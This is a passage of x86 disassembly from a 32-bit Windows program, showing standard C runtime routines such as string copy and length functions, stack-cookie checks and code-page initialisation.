  425411:	jne    0x425439
  425413:	push   0xfa0
  425418:	push   edi
  425419:	call   0x42631d
  42541e:	test   eax,eax
  425420:	pop    ecx
  425421:	pop    ecx
  425422:	jne    0x425435
  425424:	push   edi
  425425:	call   0x425e9a
  42542a:	push   0xa
  42542c:	call   0x4253bb
  425431:	pop    ecx
  425432:	pop    ecx
  425433:	jmp    0x4253f7
  425435:	mov    DWORD PTR [esi],edi
  425437:	jmp    0x425440
  425439:	push   edi
  42543a:	call   0x425e9a
  42543f:	pop    ecx
  425440:	push   0xa
  425442:	call   0x4253bb
  425447:	xor    eax,eax
  425449:	pop    ecx
  42544a:	inc    eax
  42544b:	pop    edi
  42544c:	pop    esi
  42544d:	pop    ebp
  42544e:	ret    
  42544f:	push   ebp
  425450:	mov    ebp,esp
  425452:	mov    eax,DWORD PTR [ebp+0x8]
  425455:	push   esi
  425456:	lea    esi,[eax*8+0x4668d0]
  42545d:	cmp    DWORD PTR [esi],0x0
  425460:	jne    0x425475
  425462:	push   eax
  425463:	call   0x4253d0
  425468:	test   eax,eax
  42546a:	pop    ecx
  42546b:	jne    0x425475
  42546d:	push   0x11
  42546f:	call   0x424358
  425474:	pop    ecx
  425475:	push   DWORD PTR [esi]
  425477:	call   DWORD PTR ds:0x4290c8
  42547d:	pop    esi
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   esi
  425481:	push   DWORD PTR ds:0x467828
  425487:	call   0x4273e6
  42548c:	pop    ecx
  42548d:	mov    ecx,DWORD PTR ds:0x467824
  425493:	mov    esi,eax
  425495:	mov    eax,ds:0x467828
  42549a:	mov    edx,ecx
  42549c:	sub    edx,eax
  42549e:	add    edx,0x4
  4254a1:	cmp    esi,edx
  4254a3:	jae    0x4254f3
  4254a5:	mov    ecx,0x800
  4254aa:	cmp    esi,ecx
  4254ac:	jae    0x4254b0
  4254ae:	mov    ecx,esi
  4254b0:	add    ecx,esi
  4254b2:	push   ecx
  4254b3:	push   eax
  4254b4:	call   0x427239
  4254b9:	test   eax,eax
  4254bb:	pop    ecx
  4254bc:	pop    ecx
  4254bd:	jne    0x4254d6
  4254bf:	add    esi,0x10
  4254c2:	push   esi
  4254c3:	push   DWORD PTR ds:0x467828
  4254c9:	call   0x427239
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254d6
  4254d4:	pop    esi
  4254d5:	ret    
  4254d6:	mov    ecx,DWORD PTR ds:0x467824
  4254dc:	sub    ecx,DWORD PTR ds:0x467828
  4254e2:	mov    ds:0x467828,eax
  4254e7:	sar    ecx,0x2
  4254ea:	lea    ecx,[eax+ecx*4]
  4254ed:	mov    DWORD PTR ds:0x467824,ecx
  4254f3:	mov    DWORD PTR [ecx],edi
  4254f5:	add    DWORD PTR ds:0x467824,0x4
  4254fc:	mov    eax,edi
  4254fe:	pop    esi
  4254ff:	ret    
  425500:	push   0x80
  425505:	call   0x425fb2
  42550a:	test   eax,eax
  42550c:	pop    ecx
  42550d:	mov    ds:0x467828,eax
  425512:	jne    0x425518
  425514:	push   0x18
  425516:	pop    eax
  425517:	ret    
  425518:	and    DWORD PTR [eax],0x0
  42551b:	mov    eax,ds:0x467828
  425520:	mov    ds:0x467824,eax
  425525:	xor    eax,eax
  425527:	ret    
  425528:	push   0xc
  42552a:	push   0x429520
  42552f:	call   0x425290
  425534:	call   0x4245a3
  425539:	and    DWORD PTR [ebp-0x4],0x0
  42553d:	mov    edi,DWORD PTR [ebp+0x8]
  425540:	call   0x425480
  425545:	mov    DWORD PTR [ebp-0x1c],eax
  425548:	or     DWORD PTR [ebp-0x4],0xffffffff
  42554c:	call   0x42555a
  425551:	mov    eax,DWORD PTR [ebp-0x1c]
  425554:	call   0x4252cb
  425559:	ret    
  42555a:	call   0x4245ac
  42555f:	ret    
  425560:	push   DWORD PTR [esp+0x4]
  425564:	call   0x425528
  425569:	neg    eax
  42556b:	sbb    eax,eax
  42556d:	neg    eax
  42556f:	pop    ecx
  425570:	dec    eax
  425571:	ret    
  425572:	push   ebp
  425573:	mov    ebp,esp
  425575:	sub    esp,0x10
  425578:	push   ebx
  425579:	xor    ebx,ebx
  42557b:	cmp    DWORD PTR ds:0x467330,ebx
  425581:	push   esi
  425582:	push   edi
  425583:	jne    0x4255f2
  425585:	push   0x429590
  42558a:	call   DWORD PTR ds:0x4290cc
  425590:	mov    edi,eax
  425592:	cmp    edi,ebx
  425594:	je     0x42562d
  42559a:	mov    esi,DWORD PTR ds:0x429048
  4255a0:	push   0x429584
  4255a5:	push   edi
  4255a6:	call   esi
  4255a8:	test   eax,eax
  4255aa:	mov    ds:0x467330,eax
  4255af:	je     0x42562d
  4255b1:	push   0x429574
  4255b6:	push   edi
  4255b7:	call   esi
  4255b9:	push   0x429560
  4255be:	push   edi
  4255bf:	mov    ds:0x467334,eax
  4255c4:	call   esi
  4255c6:	cmp    DWORD PTR ds:0x467084,0x2
  4255cd:	mov    ds:0x467338,eax
  4255d2:	jne    0x4255f2
  4255d4:	push   0x429544
  4255d9:	push   edi
  4255da:	call   esi
  4255dc:	test   eax,eax
  4255de:	mov    ds:0x467340,eax
  4255e3:	je     0x4255f2
  4255e5:	push   0x42952c
  4255ea:	push   edi
  4255eb:	call   esi
  4255ed:	mov    ds:0x46733c,eax
  4255f2:	mov    eax,ds:0x46733c
  4255f7:	test   eax,eax
  4255f9:	je     0x425637
  4255fb:	call   eax
  4255fd:	test   eax,eax
  4255ff:	je     0x42561e
  425601:	lea    ecx,[ebp-0x4]
  425604:	push   ecx
  425605:	push   0xc
  425607:	lea    ecx,[ebp-0x10]
  42560a:	push   ecx
  42560b:	push   0x1
  42560d:	push   eax
  42560e:	call   DWORD PTR ds:0x467340
  425614:	test   eax,eax
  425616:	je     0x42561e
  425618:	test   BYTE PTR [ebp-0x8],0x1
  42561c:	jne    0x425637
  42561e:	cmp    DWORD PTR ds:0x467090,0x4
  425625:	jb     0x425631
  425627:	or     BYTE PTR [ebp+0x12],0x20
  42562b:	jmp    0x425656
  42562d:	xor    eax,eax
  42562f:	jmp    0x425666
  425631:	or     BYTE PTR [ebp+0x12],0x4
  425635:	jmp    0x425656
  425637:	mov    eax,ds:0x467334
  42563c:	test   eax,eax
  42563e:	je     0x425656
  425640:	call   eax
  425642:	mov    ebx,eax
  425644:	test   ebx,ebx
  425646:	je     0x425656
  425648:	mov    eax,ds:0x467338
  42564d:	test   eax,eax
  42564f:	je     0x425656
  425651:	push   ebx
  425652:	call   eax
  425654:	mov    ebx,eax
  425656:	push   DWORD PTR [ebp+0x10]
  425659:	push   DWORD PTR [ebp+0xc]
  42565c:	push   DWORD PTR [ebp+0x8]
  42565f:	push   ebx
  425660:	call   DWORD PTR ds:0x467330
  425666:	pop    edi
  425667:	pop    esi
  425668:	pop    ebx
  425669:	leave  
  42566a:	ret    
  42566b:	int3   
  42566c:	int3   
  42566d:	int3   
  42566e:	int3   
  42566f:	int3   
  425670:	push   edi
  425671:	mov    edi,DWORD PTR [esp+0x8]
  425675:	jmp    0x4256e5
  425677:	lea    esp,[esp+0x0]
  42567e:	mov    edi,edi
  425680:	mov    ecx,DWORD PTR [esp+0x4]
  425684:	push   edi
  425685:	test   ecx,0x3
  42568b:	je     0x4256a0
  42568d:	mov    al,BYTE PTR [ecx]
  42568f:	add    ecx,0x1
  425692:	test   al,al
  425694:	je     0x4256d3
  425696:	test   ecx,0x3
  42569c:	jne    0x42568d
  42569e:	mov    edi,edi
  4256a0:	mov    eax,DWORD PTR [ecx]
  4256a2:	mov    edx,0x7efefeff
  4256a7:	add    edx,eax
  4256a9:	xor    eax,0xffffffff
  4256ac:	xor    eax,edx
  4256ae:	add    ecx,0x4
  4256b1:	test   eax,0x81010100
  4256b6:	je     0x4256a0
  4256b8:	mov    eax,DWORD PTR [ecx-0x4]
  4256bb:	test   al,al
  4256bd:	je     0x4256e2
  4256bf:	test   ah,ah
  4256c1:	je     0x4256dd
  4256c3:	test   eax,0xff0000
  4256c8:	je     0x4256d8
  4256ca:	test   eax,0xff000000
  4256cf:	je     0x4256d3
  4256d1:	jmp    0x4256a0
  4256d3:	lea    edi,[ecx-0x1]
  4256d6:	jmp    0x4256e5
  4256d8:	lea    edi,[ecx-0x2]
  4256db:	jmp    0x4256e5
  4256dd:	lea    edi,[ecx-0x3]
  4256e0:	jmp    0x4256e5
  4256e2:	lea    edi,[ecx-0x4]
  4256e5:	mov    ecx,DWORD PTR [esp+0xc]
  4256e9:	test   ecx,0x3
  4256ef:	je     0x42570e
  4256f1:	mov    dl,BYTE PTR [ecx]
  4256f3:	add    ecx,0x1
  4256f6:	test   dl,dl
  4256f8:	je     0x425760
  4256fa:	mov    BYTE PTR [edi],dl
  4256fc:	add    edi,0x1
  4256ff:	test   ecx,0x3
  425705:	jne    0x4256f1
  425707:	jmp    0x42570e
  425709:	mov    DWORD PTR [edi],edx
  42570b:	add    edi,0x4
  42570e:	mov    edx,0x7efefeff
  425713:	mov    eax,DWORD PTR [ecx]
  425715:	add    edx,eax
  425717:	xor    eax,0xffffffff
  42571a:	xor    eax,edx
  42571c:	mov    edx,DWORD PTR [ecx]
  42571e:	add    ecx,0x4
  425721:	test   eax,0x81010100
  425726:	je     0x425709
  425728:	test   dl,dl
  42572a:	je     0x425760
  42572c:	test   dh,dh
  42572e:	je     0x425757
  425730:	test   edx,0xff0000
  425736:	je     0x42574a
  425738:	test   edx,0xff000000
  42573e:	je     0x425742
  425740:	jmp    0x425709
  425742:	mov    DWORD PTR [edi],edx
  425744:	mov    eax,DWORD PTR [esp+0x8]
  425748:	pop    edi
  425749:	ret    
  42574a:	mov    WORD PTR [edi],dx
  42574d:	mov    eax,DWORD PTR [esp+0x8]
  425751:	mov    BYTE PTR [edi+0x2],0x0
  425755:	pop    edi
  425756:	ret    
  425757:	mov    WORD PTR [edi],dx
  42575a:	mov    eax,DWORD PTR [esp+0x8]
  42575e:	pop    edi
  42575f:	ret    
  425760:	mov    BYTE PTR [edi],dl
  425762:	mov    eax,DWORD PTR [esp+0x8]
  425766:	pop    edi
  425767:	ret    
  425768:	int3   
  425769:	int3   
  42576a:	int3   
  42576b:	int3   
  42576c:	int3   
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	mov    ecx,DWORD PTR [esp+0xc]
  425774:	push   edi
  425775:	test   ecx,ecx
  425777:	je     0x42580f
  42577d:	push   esi
  42577e:	push   ebx
  42577f:	mov    ebx,ecx
  425781:	mov    esi,DWORD PTR [esp+0x14]
  425785:	test   esi,0x3
  42578b:	mov    edi,DWORD PTR [esp+0x10]
  42578f:	jne    0x42579c
  425791:	shr    ecx,0x2
  425794:	jne    0x42581f
  42579a:	jmp    0x4257c3
  42579c:	mov    al,BYTE PTR [esi]
  42579e:	add    esi,0x1
  4257a1:	mov    BYTE PTR [edi],al
  4257a3:	add    edi,0x1
  4257a6:	sub    ecx,0x1
  4257a9:	je     0x4257d6
  4257ab:	test   al,al
  4257ad:	je     0x4257de
  4257af:	test   esi,0x3
  4257b5:	jne    0x42579c
  4257b7:	mov    ebx,ecx
  4257b9:	shr    ecx,0x2
  4257bc:	jne    0x42581f
  4257be:	and    ebx,0x3
  4257c1:	je     0x4257d6
  4257c3:	mov    al,BYTE PTR [esi]
  4257c5:	add    esi,0x1
  4257c8:	mov    BYTE PTR [edi],al
  4257ca:	add    edi,0x1
  4257cd:	test   al,al
  4257cf:	je     0x425808
  4257d1:	sub    ebx,0x1
  4257d4:	jne    0x4257c3
  4257d6:	mov    eax,DWORD PTR [esp+0x10]
  4257da:	pop    ebx
  4257db:	pop    esi
  4257dc:	pop    edi
  4257dd:	ret    
  4257de:	test   edi,0x3
  4257e4:	je     0x4257fc
  4257e6:	mov    BYTE PTR [edi],al
  4257e8:	add    edi,0x1
  4257eb:	sub    ecx,0x1
  4257ee:	je     0x42588c
  4257f4:	test   edi,0x3
  4257fa:	jne    0x4257e6
  4257fc:	mov    ebx,ecx
  4257fe:	shr    ecx,0x2
  425801:	jne    0x425877
  425803:	mov    BYTE PTR [edi],al
  425805:	add    edi,0x1
  425808:	sub    ebx,0x1
  42580b:	jne    0x425803
  42580d:	pop    ebx
  42580e:	pop    esi
  42580f:	mov    eax,DWORD PTR [esp+0x8]
  425813:	pop    edi
  425814:	ret    
  425815:	mov    DWORD PTR [edi],edx
  425817:	add    edi,0x4
  42581a:	sub    ecx,0x1
  42581d:	je     0x4257be
  42581f:	mov    edx,0x7efefeff
  425824:	mov    eax,DWORD PTR [esi]
  425826:	add    edx,eax
  425828:	xor    eax,0xffffffff
  42582b:	xor    eax,edx
  42582d:	mov    edx,DWORD PTR [esi]
  42582f:	add    esi,0x4
  425832:	test   eax,0x81010100
  425837:	je     0x425815
  425839:	test   dl,dl
  42583b:	je     0x425869
  42583d:	test   dh,dh
  42583f:	je     0x42585f
  425841:	test   edx,0xff0000
  425847:	je     0x425855
  425849:	test   edx,0xff000000
  42584f:	jne    0x425815
  425851:	mov    DWORD PTR [edi],edx
  425853:	jmp    0x42586d
  425855:	and    edx,0xffff
  42585b:	mov    DWORD PTR [edi],edx
  42585d:	jmp    0x42586d
  42585f:	and    edx,0xff
  425865:	mov    DWORD PTR [edi],edx
  425867:	jmp    0x42586d
  425869:	xor    edx,edx
  42586b:	mov    DWORD PTR [edi],edx
  42586d:	add    edi,0x4
  425870:	xor    eax,eax
  425872:	sub    ecx,0x1
  425875:	je     0x425883
  425877:	xor    eax,eax
  425879:	mov    DWORD PTR [edi],eax
  42587b:	add    edi,0x4
  42587e:	sub    ecx,0x1
  425881:	jne    0x425879
  425883:	and    ebx,0x3
  425886:	jne    0x425803
  42588c:	mov    eax,DWORD PTR [esp+0x10]
  425890:	pop    ebx
  425891:	pop    esi
  425892:	pop    edi
  425893:	ret    
  425894:	int3   
  425895:	int3   
  425896:	int3   
  425897:	int3   
  425898:	int3   
  425899:	int3   
  42589a:	int3   
  42589b:	int3   
  42589c:	int3   
  42589d:	int3   
  42589e:	int3   
  42589f:	int3   
  4258a0:	mov    ecx,DWORD PTR [esp+0x4]
  4258a4:	test   ecx,0x3
  4258aa:	je     0x4258d0
  4258ac:	mov    al,BYTE PTR [ecx]
  4258ae:	add    ecx,0x1
  4258b1:	test   al,al
  4258b3:	je     0x425903
  4258b5:	test   ecx,0x3
  4258bb:	jne    0x4258ac
  4258bd:	add    eax,0x0
  4258c2:	lea    esp,[esp+0x0]
  4258c9:	lea    esp,[esp+0x0]
  4258d0:	mov    eax,DWORD PTR [ecx]
  4258d2:	mov    edx,0x7efefeff
  4258d7:	add    edx,eax
  4258d9:	xor    eax,0xffffffff
  4258dc:	xor    eax,edx
  4258de:	add    ecx,0x4
  4258e1:	test   eax,0x81010100
  4258e6:	je     0x4258d0
  4258e8:	mov    eax,DWORD PTR [ecx-0x4]
  4258eb:	test   al,al
  4258ed:	je     0x425921
  4258ef:	test   ah,ah
  4258f1:	je     0x425917
  4258f3:	test   eax,0xff0000
  4258f8:	je     0x42590d
  4258fa:	test   eax,0xff000000
  4258ff:	je     0x425903
  425901:	jmp    0x4258d0
  425903:	lea    eax,[ecx-0x1]
  425906:	mov    ecx,DWORD PTR [esp+0x4]
  42590a:	sub    eax,ecx
  42590c:	ret    
  42590d:	lea    eax,[ecx-0x2]
  425910:	mov    ecx,DWORD PTR [esp+0x4]
  425914:	sub    eax,ecx
  425916:	ret    
  425917:	lea    eax,[ecx-0x3]
  42591a:	mov    ecx,DWORD PTR [esp+0x4]
  42591e:	sub    eax,ecx
  425920:	ret    
  425921:	lea    eax,[ecx-0x4]
  425924:	mov    ecx,DWORD PTR [esp+0x4]
  425928:	sub    eax,ecx
  42592a:	ret    
  42592b:	push   0x8
  42592d:	push   0x4295a0
  425932:	call   0x425290
  425937:	and    DWORD PTR [ebp-0x4],0x0
  42593b:	push   0x0
  42593d:	push   0x1
  42593f:	call   0x4274b2
  425944:	pop    ecx
  425945:	pop    ecx
  425946:	jmp    0x42594f
  425948:	xor    eax,eax
  42594a:	inc    eax
  42594b:	ret    
  42594c:	mov    esp,DWORD PTR [ebp-0x18]
  42594f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425953:	push   0x3
  425955:	call   DWORD PTR ds:0x429070
  42595b:	int3   
  42595c:	cmp    ecx,DWORD PTR ds:0x4669f0
  425962:	jne    0x425965
  425964:	ret    
  425965:	jmp    0x42592b
  42596a:	movzx  eax,BYTE PTR [esp+0x4]
  42596f:	mov    cl,BYTE PTR [esp+0xc]
  425973:	test   BYTE PTR [eax+0x4674e1],cl
  425979:	jne    0x425997
  42597b:	cmp    DWORD PTR [esp+0x8],0x0
  425980:	je     0x425990
  425982:	movzx  eax,WORD PTR [eax*2+0x42999a]
  42598a:	and    eax,DWORD PTR [esp+0x8]
  42598e:	jmp    0x425992
  425990:	xor    eax,eax
  425992:	test   eax,eax
  425994:	jne    0x425997
  425996:	ret    
  425997:	xor    eax,eax
  425999:	inc    eax
  42599a:	ret    
  42599b:	push   0x4
  42599d:	push   0x0
  42599f:	push   DWORD PTR [esp+0xc]
  4259a3:	call   0x42596a
  4259a8:	add    esp,0xc
  4259ab:	ret    
  4259ac:	sub    eax,0x3a4
  4259b1:	je     0x4259d5
  4259b3:	sub    eax,0x4
  4259b6:	je     0x4259cf
  4259b8:	sub    eax,0xd
  4259bb:	je     0x4259c9
  4259bd:	dec    eax
  4259be:	je     0x4259c3
  4259c0:	xor    eax,eax
  4259c2:	ret    
  4259c3:	mov    eax,0x404
  4259c8:	ret    
  4259c9:	mov    eax,0x412
  4259ce:	ret    
  4259cf:	mov    eax,0x804
  4259d4:	ret    
  4259d5:	mov    eax,0x411
  4259da:	ret    
  4259db:	push   edi
  4259dc:	push   0x40
  4259de:	xor    eax,eax
  4259e0:	pop    ecx
  4259e1:	mov    edi,0x4674e0
  4259e6:	rep stos DWORD PTR es:[edi],eax
  4259e8:	stos   BYTE PTR es:[edi],al
  4259e9:	xor    eax,eax
  4259eb:	mov    ds:0x4675e4,eax
  4259f0:	mov    ds:0x4674dc,eax
  4259f5:	mov    ds:0x4674d4,eax
  4259fa:	mov    edi,0x4675f0
  4259ff:	stos   DWORD PTR es:[edi],eax
  425a00:	stos   DWORD PTR es:[edi],eax
  425a01:	stos   DWORD PTR es:[edi],eax
  425a02:	pop    edi
  425a03:	ret    
  425a04:	push   ebp
  425a05:	mov    ebp,esp
  425a07:	sub    esp,0x518
  425a0d:	mov    eax,ds:0x4669f0
  425a12:	xor    eax,DWORD PTR [ebp+0x4]
  425a15:	push   esi
  425a16:	mov    DWORD PTR [ebp-0x4],eax
  425a19:	lea    eax,[ebp-0x18]
  425a1c:	push   eax
  425a1d:	push   DWORD PTR ds:0x4675e4
  425a23:	call   DWORD PTR ds:0x4290d8
  425a29:	cmp    eax,0x1
  425a2c:	mov    esi,0x100
  425a31:	jne    0x425b44
  425a37:	xor    eax,eax
  425a39:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425a40:	inc    eax
  425a41:	cmp    eax,esi
  425a43:	jb     0x425a39
  425a45:	mov    al,BYTE PTR [ebp-0x12]
  425a48:	test   al,al
  425a4a:	mov    BYTE PTR [ebp-0x118],0x20
  425a51:	je     0x425a89
  425a53:	push   ebx
  425a54:	lea    edx,[ebp-0x11]
  425a57:	push   edi
  425a58:	movzx  ecx,BYTE PTR [edx]
  425a5b:	movzx  eax,al
  425a5e:	cmp    eax,ecx
  425a60:	ja     0x425a7f
  425a62:	sub    ecx,eax
  425a64:	inc    ecx
  425a65:	mov    ebx,ecx
  425a67:	shr    ecx,0x2
  425a6a:	lea    edi,[ebp+eax*1-0x118]
  425a71:	mov    eax,0x20202020
  425a76:	rep stos DWORD PTR es:[edi],eax
  425a78:	mov    ecx,ebx
  425a7a:	and    ecx,0x3
  425a7d:	rep stos BYTE PTR es:[edi],al
  425a7f:	inc    edx
  425a80:	mov    al,BYTE PTR [edx]
  425a82:	inc    edx
  425a83:	test   al,al
  425a85:	jne    0x425a58
  425a87:	pop    edi
  425a88:	pop    ebx
  425a89:	push   0x0
  425a8b:	push   DWORD PTR ds:0x4674d4
  425a91:	lea    eax,[ebp-0x518]
  425a97:	push   DWORD PTR ds:0x4675e4
  425a9d:	push   eax
  425a9e:	push   esi
  425a9f:	lea    eax,[ebp-0x118]
  425aa5:	push   eax
  425aa6:	push   0x1
  425aa8:	call   0x4279b8
  425aad:	push   0x0
  425aaf:	push   DWORD PTR ds:0x4675e4
  425ab5:	lea    eax,[ebp-0x218]
  425abb:	push   esi
  425abc:	push   eax
  425abd:	push   esi
  425abe:	lea    eax,[ebp-0x118]
  425ac4:	push   eax
  425ac5:	push   esi
  425ac6:	push   DWORD PTR ds:0x4674d4
  425acc:	call   0x4275fc
  425ad1:	push   0x0
  425ad3:	push   DWORD PTR ds:0x4675e4
  425ad9:	lea    eax,[ebp-0x318]
  425adf:	push   esi
  425ae0:	push   eax
  425ae1:	push   esi
  425ae2:	lea    eax,[ebp-0x118]
  425ae8:	push   eax
  425ae9:	push   0x200
  425aee:	push   DWORD PTR ds:0x4674d4
  425af4:	call   0x4275fc
  425af9:	add    esp,0x5c
  425afc:	xor    eax,eax
  425afe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425b06:	test   cl,0x1
  425b09:	je     0x425b21
  425b0b:	or     BYTE PTR [eax+0x4674e1],0x10
  425b12:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425b19:	mov    BYTE PTR [eax+0x467600],cl
  425b1f:	jmp    0x425b3d
  425b21:	test   cl,0x2
  425b24:	je     0x425b36
  425b26:	or     BYTE PTR [eax+0x4674e1],0x20
  425b2d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425b34:	jmp    0x425b19
  425b36:	and    BYTE PTR [eax+0x467600],0x0
  425b3d:	inc    eax
  425b3e:	cmp    eax,esi
  425b40:	jb     0x425afe
  425b42:	jmp    0x425b88
  425b44:	xor    eax,eax
  425b46:	cmp    eax,0x41
  425b49:	jb     0x425b64
  425b4b:	cmp    eax,0x5a
  425b4e:	ja     0x425b64
  425b50:	or     BYTE PTR [eax+0x4674e1],0x10
  425b57:	mov    cl,al
  425b59:	add    cl,0x20
  425b5c:	mov    BYTE PTR [eax+0x467600],cl
  425b62:	jmp    0x425b83
  425b64:	cmp    eax,0x61
  425b67:	jb     0x425b7c
  425b69:	cmp    eax,0x7a
  425b6c:	ja     0x425b7c
  425b6e:	or     BYTE PTR [eax+0x4674e1],0x20
  425b75:	mov    cl,al
  425b77:	sub    cl,0x20
  425b7a:	jmp    0x425b5c
  425b7c:	and    BYTE PTR [eax+0x467600],0x0
  425b83:	inc    eax
  425b84:	cmp    eax,esi
  425b86:	jb     0x425b46
  425b88:	mov    ecx,DWORD PTR [ebp-0x4]
  425b8b:	xor    ecx,DWORD PTR [ebp+0x4]
  425b8e:	pop    esi
  425b8f:	call   0x42595c
  425b94:	leave  
  425b95:	ret    
  425b96:	push   ebp
  425b97:	mov    ebp,esp
  425b99:	sub    esp,0x1c
  425b9c:	mov    eax,ds:0x4669f0
  425ba1:	xor    eax,DWORD PTR [ebp+0x4]
  425ba4:	push   ebx
  425ba5:	push   esi
  425ba6:	mov    esi,DWORD PTR [ebp+0x8]
  425ba9:	xor    ebx,ebx
  425bab:	cmp    esi,ebx
  425bad:	mov    DWORD PTR [ebp-0x4],eax
  425bb0:	push   edi
  425bb1:	je     0x425d0b
  425bb7:	xor    edx,edx
  425bb9:	xor    eax,eax
  425bbb:	cmp    DWORD PTR [eax+0x466a00],esi
  425bc1:	je     0x425c28
  425bc3:	add    eax,0x30
  425bc6:	inc    edx
  425bc7:	cmp    eax,0xf0
  425bcc:	jb     0x425bbb
  425bce:	lea    eax,[ebp-0x1c]
  425bd1:	push   eax
  425bd2:	push   esi
  425bd3:	call   DWORD PTR ds:0x4290d8
  425bd9:	cmp    eax,0x1
  425bdc:	jne    0x425d03
  425be2:	push   0x40
  425be4:	xor    eax,eax
  425be6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425bea:	pop    ecx
  425beb:	mov    edi,0x4674e0
  425bf0:	rep stos DWORD PTR es:[edi],eax
  425bf2:	stos   BYTE PTR es:[edi],al
  425bf3:	mov    DWORD PTR ds:0x4675e4,esi
  425bf9:	mov    DWORD PTR ds:0x4674d4,ebx
  425bff:	jbe    0x425cf1
  425c05:	cmp    BYTE PTR [ebp-0x16],0x0
  425c09:	je     0x425cc9
  425c0f:	lea    ecx,[ebp-0x15]
  425c12:	mov    dl,BYTE PTR [ecx]
  425c14:	test   dl,dl
  425c16:	je     0x425cc9
  425c1c:	movzx  eax,BYTE PTR [ecx-0x1]
  425c20:	movzx  edx,dl
  425c23:	jmp    0x425cb9
  425c28:	push   0x40
  425c2a:	xor    eax,eax
  425c2c:	pop    ecx
  425c2d:	mov    edi,0x4674e0
  425c32:	rep stos DWORD PTR es:[edi],eax
  425c34:	lea    ecx,[edx+edx*2]
  425c37:	shl    ecx,0x4
  425c3a:	mov    DWORD PTR [ebp-0x8],ebx
  425c3d:	stos   BYTE PTR es:[edi],al
  425c3e:	lea    ebx,[ecx+0x466a10]
  425c44:	mov    al,BYTE PTR [ebx]
  425c46:	mov    esi,ebx
  425c48:	jmp    0x425c73
  425c4a:	mov    dl,BYTE PTR [esi+0x1]
  425c4d:	test   dl,dl
  425c4f:	je     0x425c77
  425c51:	movzx  eax,al
  425c54:	movzx  edi,dl
  425c57:	cmp    eax,edi
  425c59:	ja     0x425c6f
  425c5b:	mov    edx,DWORD PTR [ebp-0x8]
  425c5e:	mov    dl,BYTE PTR [edx+0x4669f8]
  425c64:	or     BYTE PTR [eax+0x4674e1],dl
  425c6a:	inc    eax
  425c6b:	cmp    eax,edi
  425c6d:	jbe    0x425c64
  425c6f:	inc    esi
  425c70:	inc    esi
  425c71:	mov    al,BYTE PTR [esi]
  425c73:	test   al,al
  425c75:	jne    0x425c4a
  425c77:	inc    DWORD PTR [ebp-0x8]
  425c7a:	add    ebx,0x8
  425c7d:	cmp    DWORD PTR [ebp-0x8],0x4
  425c81:	jb     0x425c44
  425c83:	mov    eax,DWORD PTR [ebp+0x8]
  425c86:	mov    ds:0x4675e4,eax
  425c8b:	mov    DWORD PTR ds:0x4674dc,0x1
  425c95:	call   0x4259ac
  425c9a:	lea    ecx,[ecx+0x466a04]
  425ca0:	mov    esi,ecx
  425ca2:	mov    edi,0x4675f0
  425ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ca9:	mov    ds:0x4674d4,eax
  425cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425caf:	jmp    0x425d10
  425cb1:	or     BYTE PTR [eax+0x4674e1],0x4
  425cb8:	inc    eax
  425cb9:	cmp    eax,edx
  425cbb:	jbe    0x425cb1
  425cbd:	inc    ecx
  425cbe:	inc    ecx
  425cbf:	cmp    BYTE PTR [ecx-0x1],0x0
  425cc3:	jne    0x425c12
  425cc9:	xor    ecx,ecx
  425ccb:	inc    ecx
  425ccc:	mov    eax,ecx
  425cce:	or     BYTE PTR [eax+0x4674e1],0x8
  425cd5:	inc    eax
  425cd6:	cmp    eax,0xff
  425cdb:	jb     0x425cce
  425cdd:	mov    eax,esi
  425cdf:	call   0x4259ac
  425ce4:	mov    ds:0x4674d4,eax
  425ce9:	mov    DWORD PTR ds:0x4674dc,ecx
  425cef:	jmp    0x425cf7
  425cf1:	mov    DWORD PTR ds:0x4674dc,ebx
  425cf7:	xor    eax,eax
  425cf9:	mov    edi,0x4675f0
  425cfe:	stos   DWORD PTR es:[edi],eax
  425cff:	stos   DWORD PTR es:[edi],eax
  425d00:	stos   DWORD PTR es:[edi],eax
  425d01:	jmp    0x425d10
  425d03:	cmp    DWORD PTR ds:0x467344,ebx
  425d09:	je     0x425d19
  425d0b:	call   0x4259db
  425d10:	call   0x425a04
  425d15:	xor    eax,eax
  425d17:	jmp    0x425d1c
  425d19:	or     eax,0xffffffff
  425d1c:	mov    ecx,DWORD PTR [ebp-0x4]
  425d1f:	xor    ecx,DWORD PTR [ebp+0x4]
  425d22:	pop    edi
  425d23:	pop    esi
  425d24:	pop    ebx
  425d25:	call   0x42595c
  425d2a:	leave  
  425d2b:	ret    
  425d2c:	push   0x14
  425d2e:	push   0x4295b0
  425d33:	call   0x425290
  425d38:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425d3c:	push   0xd
  425d3e:	call   0x42544f
  425d43:	pop    ecx
  425d44:	xor    edi,edi
  425d46:	mov    DWORD PTR [ebp-0x4],edi
  425d49:	mov    DWORD PTR ds:0x467344,edi
  425d4f:	mov    eax,DWORD PTR [ebp+0x8]
  425d52:	cmp    eax,0xfffffffe
  425d55:	jne    0x425d69
  425d57:	mov    DWORD PTR ds:0x467344,0x1
  425d61:	call   DWORD PTR ds:0x4290d4
  425d67:	jmp    0x425d94
  425d69:	cmp    eax,0xfffffffd
  425d6c:	jne    0x425d80
  425d6e:	mov    DWORD PTR ds:0x467344,0x1
  425d78:	call   DWORD PTR ds:0x4290d0
  425d7e:	jmp    0x425d94
  425d80:	cmp    eax,0xfffffffc
  425d83:	jne    0x425d94
  425d85:	mov    DWORD PTR ds:0x467344,0x1
  425d8f:	mov    eax,ds:0x467374
  425d94:	mov    DWORD PTR [ebp+0x8],eax
  425d97:	cmp    eax,DWORD PTR ds:0x4675e4
  425d9d:	je     0x425e5e
  425da3:	mov    esi,DWORD PTR ds:0x4674d8
  425da9:	mov    DWORD PTR [ebp-0x20],esi
  425dac:	cmp    esi,edi
  425dae:	je     0x425db4
  425db0:	cmp    DWORD PTR [esi],edi
  425db2:	je     0x425dc4
  425db4:	push   0x220
  425db9:	call   0x425fb2
